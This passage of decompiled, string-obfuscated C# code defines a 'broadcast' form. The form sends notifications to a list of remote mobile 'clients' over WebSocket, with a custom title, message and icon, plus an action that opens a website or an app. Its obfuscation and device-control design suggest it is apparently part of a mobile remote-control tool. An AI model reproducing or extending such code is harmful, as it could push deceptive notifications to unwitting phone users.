		dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle3.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle3.Font = new System.Drawing.Font(EXGuarder._5F75121F, 9f);
		dataGridViewCellStyle3.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.FromArgb(64, 64, 64);
		dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGVC.DefaultCellStyle = dataGridViewCellStyle3;
		this.DGVC.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DGVC.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
		this.DGVC.EnableHeadersVisualStyles = false;
		this.DGVC.GridColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DGVC.Location = new System.Drawing.Point(9, 9);
		this.DGVC.MultiSelect = false;
		this.DGVC.Name = EXGuarder._520B5B26;
		this.DGVC.ReadOnly = true;
		this.DGVC.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle4.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle4.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle4.Font = new System.Drawing.Font(EXGuarder._5F75121F, 9f);
		dataGridViewCellStyle4.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle4.SelectionBackColor = System.Drawing.Color.FromArgb(64, 64, 64);
		dataGridViewCellStyle4.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle4.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGVC.RowHeadersDefaultCellStyle = dataGridViewCellStyle4;
		this.DGVC.RowHeadersVisible = false;
		this.DGVC.RowHeadersWidth = 51;
		dataGridViewCellStyle5.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle5.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle5.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle5.SelectionBackColor = System.Drawing.Color.FromArgb(64, 64, 64);
		dataGridViewCellStyle5.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle5.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGVC.RowsDefaultCellStyle = dataGridViewCellStyle5;
		this.DGVC.RowTemplate.Height = 24;
		this.DGVC.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DGVC.Size = new System.Drawing.Size(491, 619);
		this.DGVC.TabIndex = 42;
		this.slctclum.FillWeight = 25f;
		this.slctclum.HeaderText = EXGuarder._64381C18;
		this.slctclum.MinimumWidth = 6;
		this.slctclum.Name = EXGuarder._2F3F0F48;
		this.slctclum.ReadOnly = true;
		this.apicoclm.FillWeight = 35f;
		this.apicoclm.HeaderText = EXGuarder._2E731265;
		this.apicoclm.MinimumWidth = 6;
		this.apicoclm.Name = EXGuarder._305D016F;
		this.apicoclm.ReadOnly = true;
		this.numnamclm.HeaderText = EXGuarder._28303D33;
		this.numnamclm.MinimumWidth = 6;
		this.numnamclm.Name = EXGuarder._48276C23;
		this.numnamclm.ReadOnly = true;
		this.Panel5.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel5.Controls.Add(this.sndbtn);
		this.Panel5.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Panel5.Location = new System.Drawing.Point(9, 628);
		this.Panel5.Name = EXGuarder._37064553;
		this.Panel5.Padding = new System.Windows.Forms.Padding(4);
		this.Panel5.Size = new System.Drawing.Size(491, 43);
		this.Panel5.TabIndex = 0;
		this.sndbtn.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.sndbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.sndbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.sndbtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.sndbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.sndbtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.sndbtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.sndbtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.sndbtn.Font = new System.Drawing.Font(EXGuarder._5F75121F, 10f);
		this.sndbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.sndbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.sndbtn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.sndbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.sndbtn.Location = new System.Drawing.Point(365, 4);
		this.sndbtn.Name = EXGuarder._17101D51;
		this.sndbtn.Radius = 15;
		this.sndbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.sndbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.sndbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.sndbtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.sndbtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.sndbtn.Size = new System.Drawing.Size(122, 35);
		this.sndbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.sndbtn.Symbol = 61912;
		this.sndbtn.SymbolSize = 20;
		this.sndbtn.TabIndex = 22;
		this.sndbtn.Text = EXGuarder._144C6E43;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 18f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(856, 752);
		base.Controls.Add(this.TableLayoutPanel1);
		base.Icon = (System.Drawing.Icon)resources.GetObject(EXGuarder._50446959);
		this.MinimumSize = new System.Drawing.Size(791, 665);
		base.Name = EXGuarder._6D4D1B54;
		this.Text = EXGuarder._6D4D1B54;
		base.Controls.SetChildIndex(this.tobpanelsti, 0);
		base.Controls.SetChildIndex(this.TableLayoutPanel1, 0);
		((System.ComponentModel.ISupportInitialize)this.myscr).EndInit();
		((System.ComponentModel.ISupportInitialize)this.myico).EndInit();
		this.tobpanelsti.ResumeLayout(false);
		this.TableLayoutPanel1.ResumeLayout(false);
		this.Panel4.ResumeLayout(false);
		this.panelicon.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.brodicon).EndInit();
		this.Panel3.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.DGVC).EndInit();
		this.Panel5.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	public BTBroadcast()
	{
		base.Load += BTBroadcast_Load;
		iconpath = null;
		listclients = new List<BTClient>();
		Selectedids = new List<string>();
		InitializeComponent();
	}

	private void translateme()
	{
		object value = BTRegistry.GetValue(EXGuarder._4654484D, EXGuarder._48285103);
		if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._3E285021, TextCompare: false))
		{
			titletxt.Text = EXGuarder._4C4E4444;
			Label1.Text = EXGuarder._3A125B1B;
			Label2.Text = EXGuarder._134F0979;
			Label3.Text = EXGuarder._295A4756;
			Label4.Text = EXGuarder._0D066610;
			sndbtn.Text = EXGuarder._6B040C38;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._690F1149, TextCompare: false))
		{
			titletxt.Text = EXGuarder._353E325D;
			Label1.Text = EXGuarder._400C1542;
			Label2.Text = EXGuarder._0D111E27;
			Label3.Text = EXGuarder._110F6833;
			Label4.Text = EXGuarder._3B5A2C79;
			sndbtn.Text = EXGuarder._69770762;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._74546A2C, TextCompare: false))
		{
			titletxt.Text = EXGuarder._0F161233;
			Label1.Text = EXGuarder._54706364;
			Label2.Text = EXGuarder._6B3A435E;
			Label3.Text = EXGuarder._770C1576;
			Label4.Text = EXGuarder._14492740;
			sndbtn.Text = EXGuarder._0A71036D;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._2B690F59, TextCompare: false))
		{
			titletxt.Text = EXGuarder._364F703C;
			Label1.Text = EXGuarder._06527641;
			Label2.Text = EXGuarder._0641554C;
			Label3.Text = EXGuarder._0A184772;
			Label4.Text = EXGuarder._056A5B6F;
			sndbtn.Text = EXGuarder._2F64052E;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._17670914, TextCompare: false))
		{
			titletxt.Text = EXGuarder._532C4528;
			Label1.Text = EXGuarder._665B2D18;
			Label2.Text = EXGuarder._2C6C6F03;
			Label3.Text = EXGuarder._16262822;
			Label4.Text = EXGuarder._4C094402;
			sndbtn.Text = EXGuarder._60631D06;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._2A6C3C57, TextCompare: false))
		{
			titletxt.Text = EXGuarder._532C4528;
			Label1.Text = EXGuarder._24663E15;
			Label2.Text = EXGuarder._2C6C6F03;
			Label3.Text = EXGuarder._32174846;
			Label4.Text = EXGuarder._6F38592F;
			sndbtn.Text = EXGuarder._60631D06;
		}
	}

	private void BTBroadcast_Load(object sender, EventArgs e)
	{
		mytitle.Text = BTConst.Broadcaststr;
		foreach (BTClient listclient in listclients)
		{
			int index = DGVC.Rows.Add(true, listclient.wallpaper, listclient.name);
			DGVC.Rows[index].Tag = listclient.mobid;
			DGVC.Rows[index].Cells[0].Tag = listclient.Serverins;
		}
	}

	private void comboactions_SelectedIndexChanged(object sender, EventArgs e)
	{
		string left = comboactions.Text;
		if (Operators.CompareString(left, EXGuarder._695D303D, TextCompare: false) != 0)
		{
			if (Operators.CompareString(left, EXGuarder._30716C16, TextCompare: false) != 0)
			{
				if (Operators.CompareString(left, EXGuarder._1E2B1D0D, TextCompare: false) == 0)
				{
					actoninput.Watermark = EXGuarder._06466F0B;
					actoninput.Visible = true;
				}
				else
				{
					comboactions.Text = EXGuarder._695D303D;
				}
			}
			else
			{
				actoninput.Watermark = EXGuarder._13164231;
				actoninput.Visible = true;
			}
		}
		else
		{
			actoninput.Visible = false;
		}
	}

	private void combostyles_SelectedIndexChanged(object sender, EventArgs e)
	{
		string left = combostyles.Text;
		if (Operators.CompareString(left, EXGuarder._60546D02, TextCompare: false) == 0)
		{
			panelicon.Visible = true;
			return;
		}
		combostyles.Text = EXGuarder._0C440D4D;
		panelicon.Visible = false;
	}

	private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
		OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Title = EXGuarder._0557004B;
		openFileDialog.Filter = EXGuarder._571B3457;
		DialogResult dialogResult = openFileDialog.ShowDialog();
		if (dialogResult == DialogResult.OK)
		{
			if (!codes.IsPngImage(openFileDialog.FileName))
			{
				BTAlerter.erroes(EXGuarder._380E7554);
				brodicon.Image = null;
				iconpath = null;
			}
			else
			{
				iconpath = openFileDialog.FileName;
				brodicon.Image = codes.ResizeImage(Image.FromFile(openFileDialog.FileName), new Size(75, 75));
			}
		}
		else
		{
			brodicon.Image = null;
			iconpath = null;
		}
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		string title = titlebrod.Text;
		if (codes.StrisEmpty(title))
		{
			title = EXGuarder._06200632;
		}
		string _2 = msgtext.Text;
		if (codes.StrisEmpty(_2))
		{
			_2 = EXGuarder._06200632;
		}
		string value = EXGuarder._4012575C;
		string _4012575C = EXGuarder._4012575C;
		string left = comboactions.Text;
		if (Operators.CompareString(left, EXGuarder._150C5D76, TextCompare: false) != 0)
		{
			if (Operators.CompareString(left, EXGuarder._53475F17, TextCompare: false) == 0)
			{
				value = EXGuarder._17415A47;
				_4012575C = actoninput.Text;
				if (codes.StrisEmpty(_4012575C))
				{
					BTAlerter.infos(BTConst.enterappidstr);
					return;
				}
			}
		}
		else
		{
			value = EXGuarder._50460A0F;
			_4012575C = actoninput.Text;
			if (codes.StrisEmpty(_4012575C))
			{
				BTAlerter.infos(BTConst.entersitestr);
				return;
			}
		}
		string value2 = EXGuarder._1B775129;
		string value3 = EXGuarder._4012575C;
		if (Operators.CompareString(combostyles.Text, EXGuarder._70357152, TextCompare: false) != 0)
		{
			value2 = EXGuarder._2E5E1433;
			if (iconpath == null || !File.Exists(iconpath))
			{
				BTAlerter.infos(BTConst.selcticostr);
				return;
			}
			Bitmap bitmap = (Bitmap)codes.ResizeImage(Image.FromFile(iconpath), new Size(75, 75));
			byte[] inArray = null;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				bitmap.Save(memoryStream, ImageFormat.Png);
				inArray = memoryStream.ToArray();
			}
			value3 = Convert.ToBase64String(inArray);
		}
		bool flag = true;
		foreach (DataGridViewRow item in (IEnumerable)DGVC.Rows)
		{
			try
			{
				if (Operators.ConditionalCompareObjectEqual(item.Cells[0].Value, true, TextCompare: false))
				{
					ServersInfo serversInfo = (ServersInfo)item.Cells[0].Tag;
					flag = false;
					string mobpid = item.Tag.ToString();
					Dictionary<string, object> dictionary = new Dictionary<string, object>();
					dictionary.Add(EXGuarder._0E06503C, EXGuarder._57500D11);
					dictionary.Add(EXGuarder._4E621335, value2);
					dictionary.Add(EXGuarder._784A3A3A, _4012575C);
					dictionary.Add(EXGuarder._020A085E, value);
					dictionary.Add(EXGuarder._58051665, title);
					dictionary.Add(EXGuarder._41495E1E, value3);
					dictionary.Add(EXGuarder._501F0C20, _2);
					Dictionary<string, object> chatData = dictionary;
					BTEngine.commands(chatData, mobpid, serversInfo.WSClient);
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
		if (flag)
		{
			BTAlerter.infos(BTConst.selcclistr);
		}
	}

	private void DataGridView1_CellPainting(object sender, DataGridViewCellPaintingEventArgs e)
	{
		DataGridView dataGridView = (DataGridView)sender;
		if (e.RowIndex < 0 || e.ColumnIndex < 0)
		{
			return;
		}
		e.Handled = true;
		e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
		Rectangle cellBounds = e.CellBounds;
		cellBounds.Inflate(0, -2);
		using (SolidBrush brush = new SolidBrush(Color.FromArgb(6, 10, 15)))
		{
			e.Graphics.FillRectangle(brush, e.CellBounds);
		}
		int radius = 15;
		GraphicsPath graphicsPath = null;
		int columnIndex = e.ColumnIndex;
		checked
		{
			int num = dataGridView.ColumnCount - 1;
			if (columnIndex == 0)
			{
				DGVC.Rows[e.RowIndex].Cells[0].Style.Padding = new Padding(0);
				graphicsPath = codes.GetRoundedRectanglePath(cellBounds, radius, roundTopLeft: true, roundTopRight: false, roundBottomRight: false);
			}
			else if (columnIndex == num)
			{
				graphicsPath = codes.GetRoundedRectanglePath(cellBounds, radius, roundTopLeft: false, roundTopRight: true, roundBottomRight: true, roundBottomLeft: false);
			}
			else
			{
				graphicsPath = new GraphicsPath();
				graphicsPath.AddRectangle(cellBounds);
			}
			Color color = default(Color);
			Color color2;
			if (dataGridView.Rows[e.RowIndex].Selected)
			{
				color = Color.FromArgb(14, 22, 33);
				color2 = Color.FromArgb(2, 176, 117);
			}
			else
			{
				Color foreColor = dataGridView.Rows[e.RowIndex].Cells[e.ColumnIndex].Style.ForeColor;
				color2 = ((!foreColor.IsEmpty) ? foreColor : Color.FromArgb(145, 163, 182));
			}
			using (SolidBrush brush2 = new SolidBrush(color))
			{
				using Pen pen = new Pen(color);
				e.Graphics.FillPath(brush2, graphicsPath);
				e.Graphics.DrawPath(pen, graphicsPath);
			}
			if (e.Value != null && e.Value is Image)
			{
				Image image = (Image)e.Value;
				Rectangle rect = new Rectangle(cellBounds.X + unchecked(checked(cellBounds.Width - image.Width) / 2), cellBounds.Y + unchecked(checked(cellBounds.Height - image.Height) / 2), image.Width, image.Height);
				e.Graphics.DrawImage(image, rect);
			}
			else
			{
				if (e.Value == null)
				{
					return;
				}
				if (e.Value is bool)
				{
					bool flag = Conversions.ToBoolean(e.Value);
					int num2 = 14;
					Rectangle rect2 = new Rectangle(cellBounds.X + unchecked(checked(cellBounds.Width - num2) / 2), cellBounds.Y + unchecked(checked(cellBounds.Height - num2) / 2), num2, num2);
					using (Pen pen2 = new Pen(color2, 2f))
					{
						e.Graphics.DrawRectangle(pen2, rect2);
					}
					if (flag)
					{
						GraphicsPath graphicsPath2 = new GraphicsPath();
						graphicsPath2.AddLines(new Point[3]
						{
							new Point(rect2.Left + 3, rect2.Top + unchecked(num2 / 2)),
							new Point(rect2.Left + unchecked(num2 / 2) - 1, rect2.Bottom - 3),
							new Point(rect2.Right - 3, rect2.Top + 3)
						});
						using Pen pen3 = new Pen(color2, 2f);
						e.Graphics.DrawPath(pen3, graphicsPath2);
					}
				}
				else
				{
					TextRenderer.DrawText(e.Graphics, e.FormattedValue.ToString(), e.CellStyle.Font, cellBounds, color2, TextFormatFlags.HorizontalCenter | TextFormatFlags.VerticalCenter | TextFormatFlags.WordBreak);
				}
			}
		}
	}
}
